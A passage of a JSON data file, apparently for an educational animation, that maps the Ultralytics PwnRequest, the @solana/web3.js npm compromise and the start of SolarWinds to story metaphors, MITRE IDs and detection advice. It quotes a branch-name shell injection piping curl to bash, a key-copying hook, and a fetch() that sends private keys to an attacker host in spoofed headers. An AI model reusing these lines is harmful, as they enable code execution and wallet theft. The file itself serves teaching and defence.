          "tone": "amber"
        },
        {
          "storyTerm": "Title label hiding extra shell punctuation marks",
          "technicalTerm": "Crafted Git branch name containing command separators injecting shell execution",
          "tone": "sky"
        },
        {
          "storyTerm": "Automated tasting robot inside the secure vault",
          "technicalTerm": "Privileged CI workflow runner holding repository write tokens and release secrets",
          "tone": "rose"
        },
        {
          "storyTerm": "Obeying the outsider during routine intake",
          "technicalTerm": "PwnRequest remote command execution inside the Ultralytics CI pipeline",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ultralytics-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public suggestion card from outside the…",
          "subtitle": "External fork pull request triggering a pull_request_target…",
          "tone": "amber"
        },
        {
          "id": "sup-ultralytics-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Title label hiding extra shell…",
          "subtitle": "Crafted Git branch name containing command separators…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card Gate",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public suggestion card from outside the gate",
          "storyExcerpt": "Standing outside the recipe factory gate, the intruder submits a public suggestion card whose title label hides extra shell punctuation marks.",
          "technicalParallel": "GitHub expands ${{ github.head_ref }} as a raw text macro prior to invoking /bin/bash, turning a branch name into arbitrary remote code execution inside the privileged CI runner.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Gate Card",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Title label hiding extra shell punctuation marks",
          "storyExcerpt": "Because the automated tasting robot pastes that external label straight into a privileged kitchen command without stripping punctuation, the robot obeys the outsider from inside the secure vault.",
          "technicalParallel": "The attacker opened a pull request from an external fork using a crafted Git branch name containing shell command separators (fix\";curl ... | bash;#).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Obeying the outsider during routine intake",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across obeying the outsider during routine intake while locking down automated tasting robot inside the secure vault.",
          "technicalParallel": "Static workflow analysis (e.g., zizmor or actionlint) flagging pull_request_target workflows that interpolate github.head_ref or PR titles in run: blocks.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tasting Robot",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Release Stamp",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Token Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "pypi-ultralytics-github-pwnrequest",
      "sectionKey": "step-2",
      "sceneKind": "sup-ultralytics-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Poisoning ultralytics/utils/downloads.py & Publishing PyPI v8.3.41–8.3.46",
      "storyCue": "Now holding the factory shipping-house distribution stamp, the intruder tucks a silent remote-fetching routine inside the kit standard download helper and ships poisoned fresh editions directly onto the public pantry shelves, bypassing the clean recipe ledger.",
      "technicalCue": "T1195.001 · PERSISTENCE — Using the compromised CI workflow and subsequently a harvested PYPI_TOKEN, the attacker injected malicious downloader logic into ultralytics/utils/downloads.py and published versions 8.3.41…",
      "storyMappings": [
        {
          "storyTerm": "Factory shipping-house distribution stamp",
          "technicalTerm": "Compromised PYPI_TOKEN publishing credentials",
          "tone": "amber"
        },
        {
          "storyTerm": "Silent remote-fetching routine inside the download helper",
          "technicalTerm": "Malicious code injected into ultralytics/utils/downloads.py safe_download()",
          "tone": "sky"
        },
        {
          "storyTerm": "Poisoned fresh editions on public pantry shelves",
          "technicalTerm": "Compromised PyPI releases ultralytics v8.3.41 through v8.3.46",
          "tone": "rose"
        },
        {
          "storyTerm": "Clean recipe ledger left behind",
          "technicalTerm": "Mismatch between signed Git source tags and published PyPI wheel archives",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ultralytics-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Factory shipping-house distribution stamp",
          "subtitle": "Compromised PYPI_TOKEN publishing credentials",
          "tone": "amber"
        },
        {
          "id": "sup-ultralytics-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Silent remote-fetching routine inside…",
          "subtitle": "Malicious code injected into ultralytics/utils/downloads.py…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Now Kit",
          "stageTag": "STEP 02 · SETUP",
          "title": "Factory shipping-house distribution stamp",
          "storyExcerpt": "Now holding the factory shipping-house distribution stamp, the intruder tucks a silent remote-fetching routine inside the kit standard download helper and ships poisoned fresh editions directly…",
          "technicalParallel": "Comparing the files inside the published .whl archive on PyPI against the corresponding Git commit in ultralytics/ultralytics revealed code in downloads.py that never existed in the public Git commit…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Silent remote-fetching routine inside the download…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses silent remote-fetching routine inside the download helper to advance toward poisoned fresh editions on public pantry shelves.",
          "technicalParallel": "Using the compromised CI workflow and subsequently a harvested PYPI_TOKEN, the attacker injected malicious downloader logic into ultralytics/utils/downloads.py and published versions 8.3.41, 8.3.42…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Clean recipe ledger left behind",
          "storyExcerpt": "Behind the scenes, clean recipe ledger left behind captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Enforce PyPI provenance attestation verification (PEP 740 cryptographic proof linking a package strictly to its trusted CI build) and diff published wheel contents against signed Git repository tags…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tasting Robot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Release Stamp",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Token Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.001"
    },
    "step-3": {
      "scenarioId": "pypi-ultralytics-github-pwnrequest",
      "sectionKey": "step-3",
      "sceneKind": "sup-ultralytics-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Downstream AI Workstation & Colab Execution of XMRig Miner (/tmp/ultralytics_runner)",
      "storyCue": "Whenever a data-science lab or cloud notebook unpacks the fresh kit and opens the manual, the hidden routine quietly downloads a coin-mining engine into a temporary closet, burns the closet door tag so simple checks miss it, and puts the lab powerful graphics ovens to work for the intruder.",
      "technicalCue": "T1496 · EXFIL & IMPACT — When downstream ML pipelines or Google Colab notebooks installed ultralytics, importing the package triggered safe_download() in downloads.py to fetch a binary payload to…",
      "storyMappings": [
        {
          "storyTerm": "Unpacking the fresh kit in a research lab",
          "technicalTerm": "Installing poisoned ultralytics on ML workstations or Google Colab notebooks",
          "tone": "amber"
        },
        {
          "storyTerm": "Coin-mining engine hidden in a temporary closet",
          "technicalTerm": "Downloaded XMRig miner executing as /tmp/ultralytics_runner",
          "tone": "sky"
        },
        {
          "storyTerm": "Burning the closet door tag",
          "technicalTerm": "Self-unlinked Linux binary running from /tmp/* (deleted)",
          "tone": "rose"
        },
        {
          "storyTerm": "Phoning the intruder mining depot",
          "technicalTerm": "Outbound mining pool connection to connect.consrensys.com:8080",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-ultralytics-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Unpacking the fresh kit in a research lab",
          "subtitle": "Installing poisoned ultralytics on ML workstations or Google…",
          "tone": "amber"
        },
        {
          "id": "sup-ultralytics-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Coin-mining engine hidden in a temporary…",
          "subtitle": "Downloaded XMRig miner executing as /tmp/ultralytics_runner",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Kit Lab",
          "stageTag": "STEP 03 · SETUP",
          "title": "Unpacking the fresh kit in a research lab",
          "storyExcerpt": "Whenever a data-science lab or cloud notebook unpacks the fresh kit and opens the manual, the hidden routine quietly downloads a coin-mining engine into a temporary closet, burns the closet…",
          "technicalParallel": "Although ls /tmp no longer shows ultralytics_runner, inspecting /proc/<pid>/exe on Linux reveals the symlink /tmp/ultralytics_runner (deleted) alongside outbound Stratum TCP traffic on port 8080.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Coin-mining",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Coin-mining engine hidden in a temporary closet",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses coin-mining engine hidden in a temporary closet to advance toward burning the closet door tag.",
          "technicalParallel": "When downstream ML pipelines or Google Colab notebooks installed ultralytics, importing the package triggered safe_download() in downloads.py to fetch a binary payload to /tmp/ultralytics_runner, mark it…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Door Tag",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Phoning the intruder mining depot",
          "storyExcerpt": "Behind the scenes, phoning the intruder mining depot captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Configure Linux EDR alerts for processes executing out of /tmp/* (deleted) (identifying unlinked temporary payloads hiding in RAM) correlated with outbound network connections to…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tasting Robot",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Release Stamp",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Token Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1496"
    }
  },
  "rspack-solana-web3js-npm-supply-chain-2024": {
    "briefing": {
      "scenarioId": "rspack-solana-web3js-npm-supply-chain-2024",
      "sectionKey": "briefing",
      "sceneKind": "sup-solana-web3-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "@solana/web3.js & @rspack/core NPM Maintainer Compromise & Private Key /… — Story-to-Technical Overview",
      "storyCue": "Imagine a locksmith guild whose widely trusted key-handling library is pulled automatically into thousands of automated currency vaults. An impostor tricks a guild maintainer on a lookalike courier website to steal their publishing seal, slips a silent key-copying scribe inside the vault key-loading latch, and mails every copied private vault key out of the building disguised as ordinary delivery-address stamps on routine postal envelopes.",
      "technicalCue": "INITIAL ACCESS: NPM Maintainer Spearphishing, Token Hijack & Malicious Version Publication -> EXFIL & IMPACT: `addToQueue` Hook Injection Inside `Keypair.fromSecretKey` & `fromSeed` -> EXFIL & IMPACT: Disguised CloudFlare Header (`CF-Connecting-IP` / `CF-Ray`) Private Key Exfiltration to `sol-rpc.xyz`",
      "storyMappings": [
        {
          "storyTerm": "Lookalike courier website stealing a publishing seal",
          "technicalTerm": "Spear-phishing NPM maintainer to hijack @solana/web3.js and @rspack/core publish tokens",
          "tone": "amber"
        },
        {
          "storyTerm": "Silent key-copying scribe inside the key-loading latch",
          "technicalTerm": "Injected addToQueue() hook inside Keypair.fromSecretKey and Keypair.fromSeed",
          "tone": "sky"
        },
        {
          "storyTerm": "Disguised delivery-address stamps on routine envelopes",
          "technicalTerm": "64-byte private keys smuggled inside fake CF-Connecting-IP and CF-Ray HTTP headers",
          "tone": "rose"
        },
        {
          "storyTerm": "Secret external mailbox receiving the stolen keys",
          "technicalTerm": "Attacker collection endpoint at sol-rpc.xyz harvesting wallet and CI secrets",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-solana-web3-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Lookalike courier website stealing a…",
          "subtitle": "Spear-phishing NPM maintainer to hijack @solana/web3.js and…",
          "tone": "amber"
        },
        {
          "id": "sup-solana-web3-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Silent key-copying scribe inside the…",
          "subtitle": "Injected addToQueue() hook inside Keypair.fromSecretKey and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Seal",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "NPM Maintainer Spearphishing, Token Hijack & Malicious Version Publication",
          "storyExcerpt": "Sending a realistic notice from a lookalike guild portal, the attacker tricks a busy package maintainer into entering their publishing passkey, then pushes freshly backdoored editions straight into the…",
          "technicalParallel": "Under the hood, the observed step executes npm publish @solana/web3.js@1.95.6 (Published to registry.npmjs.org without GitHub Release / SLSA Provenance) (which executes the technical command / telemetry…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Key-copying",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "`addToQueue` Hook Injection Inside `Keypair.fromSecretKey` & `fromSeed`",
          "storyExcerpt": "Whenever an automated vault refreshes its parts shelf and loads a wallet key into memory, a newly hidden scribe tucked inside the official key-loading hinge silently copies the raw 64-byte master secret…",
          "technicalParallel": "Under the hood, the observed step executes Keypair.fromSecretKey = function(secretKey, options) { addToQueue(secretKey); return new Keypair(...); } (which executes the technical command / telemetry…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Slip Past",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Disguised CloudFlare Header (`CF-Connecting-IP` / `CF-Ray`) Private Key Exfiltration to `sol-rpc.xyz`",
          "storyExcerpt": "To slip past watchful mailroom inspectors, the hidden scribe encodes each copied master vault key into fake transit-routing stamps on normal-looking web envelopes and mails them quietly to an impostor…",
          "technicalParallel": "Under the hood, the observed step executes fetch(\"https://sol-rpc.xyz/api/v1/bro\", { method: \"POST\", headers: { \"CF-Connecting-IP\": encodedKeyPart1, \"CF-Ray\": encodedKeyPart2 } }) (which inspects or…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phish Mirror",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Key Latch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Seal Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "rspack-solana-web3js-npm-supply-chain-2024",
      "sectionKey": "step-1",
      "sceneKind": "sup-solana-web3-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "NPM Maintainer Spearphishing, Token Hijack & Malicious Version Publication",
      "storyCue": "Sending a realistic notice from a lookalike guild portal, the attacker tricks a busy package maintainer into entering their publishing passkey, then pushes freshly backdoored editions straight into the public parts registry.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — Attackers spearphish an NPM package maintainer with publish privileges via a spoofed domain, hijack their NPM automation/publish token, and publish unauthorized minor versions…",
      "storyMappings": [
        {
          "storyTerm": "Lookalike guild portal notice",
          "technicalTerm": "Spoofed NPM security domain spear-phishing package maintainers",
          "tone": "amber"
        },
        {
          "storyTerm": "Hijacked publishing passkey",
          "technicalTerm": "Stolen NPM automation and publish token for @solana/web3.js and @rspack/core",
          "tone": "sky"
        },
        {
          "storyTerm": "Freshly backdoored editions in the registry",
          "technicalTerm": "Malicious @solana/web3.js versions 1.95.6 and 1.95.7 published to npmjs",
          "tone": "rose"
        },
        {
          "storyTerm": "Downstream automated workshops",
          "technicalTerm": "Developer workstations and CI pipelines using unpinned caret ranges (^1.95.0)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solana-web3-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Lookalike guild portal notice",
          "subtitle": "Spoofed NPM security domain spear-phishing package maintainers",
          "tone": "amber"
        },
        {
          "id": "sup-solana-web3-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Hijacked publishing passkey",
          "subtitle": "Stolen NPM automation and publish token for @solana/web3.js…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Busy Then",
          "stageTag": "STEP 01 · SETUP",
          "title": "Lookalike guild portal notice",
          "storyExcerpt": "Sending a realistic notice from a lookalike guild portal, the attacker tricks a busy package maintainer into entering their publishing passkey, then pushes freshly backdoored editions straight…",
          "technicalParallel": "Under the hood, the observed step executes npm publish @solana/web3.js@1.95.6 (Published to registry.npmjs.org without GitHub Release / SLSA Provenance) (which executes the technical command / telemetry…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Hijacked publishing passkey",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses hijacked publishing passkey to advance toward freshly backdoored editions in the registry.",
          "technicalParallel": "Attackers spearphish an NPM package maintainer with publish privileges via a spoofed domain, hijack their NPM automation/publish token, and publish unauthorized minor versions (@solana/web3.js@1.95.6 and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Busy Then",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Downstream automated workshops",
          "storyExcerpt": "Behind the scenes, downstream automated workshops captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CloudTrail Event 200 (recording CompromisedPackages=@solana/web3.js , 1.95.6, 1.95.7 & @rspack/core , 1.1.7, RootCause=Maintainer NPM publish token phishing & lack of mandatory provenance…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phish Mirror",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Key Latch",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Seal Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "rspack-solana-web3js-npm-supply-chain-2024",
      "sectionKey": "step-2",
      "sceneKind": "sup-solana-web3-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "addToQueue Hook Injection Inside Keypair.fromSecretKey & fromSeed",
      "storyCue": "Whenever an automated vault refreshes its parts shelf and loads a wallet key into memory, a newly hidden scribe tucked inside the official key-loading hinge silently copies the raw 64-byte master secret into a small outbound queue without slowing down the vault.",
      "technicalCue": "T1552.004 · EXFIL & IMPACT — Downstream applications and CI/CD pipelines running npm update or unpinned caret ranges (^1.95.0) pull @solana/web3.js@1.95.6.",
      "storyMappings": [
        {
          "storyTerm": "Refreshing the parts shelf automatically",
          "technicalTerm": "npm update resolving unpinned caret version ^1.95.0 to poisoned 1.95.6",
          "tone": "amber"
        },
        {
          "storyTerm": "Official key-loading hinge",
          "technicalTerm": "Keypair.fromSecretKey() and Keypair.fromSeed() core SDK methods",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden scribe copying the master secret",
          "technicalTerm": "Injected addToQueue() exfiltration hook capturing raw private key bytes",
          "tone": "rose"
        },
        {
          "storyTerm": "Normal vault work continuing without interruption",
          "technicalTerm": "Silent background staging preventing immediate runtime errors or crashes",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solana-web3-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Refreshing the parts shelf automatically",
          "subtitle": "npm update resolving unpinned caret version ^1.95.0 to…",
          "tone": "amber"
        },
        {
          "id": "sup-solana-web3-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Official key-loading hinge",
          "subtitle": "Keypair.fromSecretKey() and Keypair.fromSeed() core SDK methods",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Key Key-loading",
          "stageTag": "STEP 02 · SETUP",
          "title": "Refreshing the parts shelf automatically",
          "storyExcerpt": "Whenever an automated vault refreshes its parts shelf and loads a wallet key into memory, a newly hidden scribe tucked inside the official key-loading hinge silently copies the raw 64-byte…",
          "technicalParallel": "Under the hood, the observed step executes Keypair.fromSecretKey = function(secretKey, options) { addToQueue(secretKey); return new Keypair(...); } (which executes the technical command / telemetry…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Key-loading",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Official key-loading hinge",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses official key-loading hinge to advance toward hidden scribe copying the master secret.",
          "technicalParallel": "Downstream applications and CI/CD pipelines running npm update or unpinned caret ranges (^1.95.0) pull @solana/web3.js@1.95.6.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Work",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Normal vault work continuing without interruption",
          "storyExcerpt": "Behind the scenes, normal vault work continuing without interruption captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in EDR Event 1 (recording HookedApi=Keypair.fromSecretKey, & Keypair.fromSeed, InjectedRoutine=addToQueue, secretKey Base58/Hex serializer, SecondaryTarget=@rspack/core@1.1.7 postinstall CI…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phish Mirror",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Key Latch",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Seal Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1552.004"
    },
    "step-3": {
      "scenarioId": "rspack-solana-web3js-npm-supply-chain-2024",
      "sectionKey": "step-3",
      "sceneKind": "sup-solana-web3-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Disguised CloudFlare Header (CF-Connecting-IP / CF-Ray) Private Key Exfiltration to sol-rpc.xyz",
      "storyCue": "To slip past watchful mailroom inspectors, the hidden scribe encodes each copied master vault key into fake transit-routing stamps on normal-looking web envelopes and mails them quietly to an impostor courier depot.",
      "technicalCue": "T1041 · EXFIL & IMPACT — To blend into normal RPC telemetry, addToQueue() encodes the stolen 64-byte private key into fake CloudFlare HTTP request headers (CF-Connecting-IP, CF-Worker, CF-Ray) and sends an HTTPS POST…",
      "storyMappings": [
        {
          "storyTerm": "Watchful mailroom inspectors",
          "technicalTerm": "Outbound proxy, DLP, and RPC network telemetry monitors",
          "tone": "amber"
        },
        {
          "storyTerm": "Fake transit-routing stamps on web envelopes",
          "technicalTerm": "Stolen keys hidden inside spoofed CF-Connecting-IP and CF-Ray HTTP headers",
          "tone": "sky"
        },
        {
          "storyTerm": "Impostor courier depot",
          "technicalTerm": "Attacker-controlled exfiltration server at sol-rpc.xyz",
          "tone": "rose"
        },
        {
          "storyTerm": "Empty customer vaults after receipt",
          "technicalTerm": "Automated wallet sweeping using recovered 64-byte Solana private keys",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-solana-web3-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Watchful mailroom inspectors",
          "subtitle": "Outbound proxy, DLP, and RPC network telemetry monitors",
          "tone": "amber"
        },
        {
          "id": "sup-solana-web3-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Fake transit-routing stamps on web…",
          "subtitle": "Stolen keys hidden inside spoofed CF-Connecting-IP and CF-Ray…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Slip Past",
          "stageTag": "STEP 03 · SETUP",
          "title": "Watchful mailroom inspectors",
          "storyExcerpt": "To slip past watchful mailroom inspectors, the hidden scribe encodes each copied master vault key into fake transit-routing stamps on normal-looking web envelopes and mails them quietly to an…",
          "technicalParallel": "Under the hood, the observed step executes fetch(\"https://sol-rpc.xyz/api/v1/bro\", { method: \"POST\", headers: { \"CF-Connecting-IP\": encodedKeyPart1, \"CF-Ray\": encodedKeyPart2 } }) (which inspects or…",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Fake Web",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Fake transit-routing stamps on web envelopes",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses fake transit-routing stamps on web envelopes to advance toward impostor courier depot.",
          "technicalParallel": "To blend into normal RPC telemetry, addToQueue() encodes the stolen 64-byte private key into fake CloudFlare HTTP request headers (CF-Connecting-IP, CF-Worker, CF-Ray) and sends an HTTPS POST request to…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Slip Past",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Empty customer vaults after receipt",
          "storyExcerpt": "Behind the scenes, empty customer vaults after receipt captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 22 (recording ExfilDomain=https://sol-rpc.xyz/api/v1/bro, SteganographicChannel=Spoofed CloudFlare HTTP headers , CF-Connecting-IP, CF-Ray under T1041): Enforce strict egress…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phish Mirror",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Key Latch",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Seal Theft",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1041"
    }
  },
  "solarwinds-sunburst-orion-supply-chain": {
    "briefing": {
      "scenarioId": "solarwinds-sunburst-orion-supply-chain",
      "sectionKey": "briefing",
      "sceneKind": "sup-solarwinds-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "SolarWinds SUNSPOT Build Hijack & SUNBURST Backdoor (APT29) — Story-to-Technical Overview",
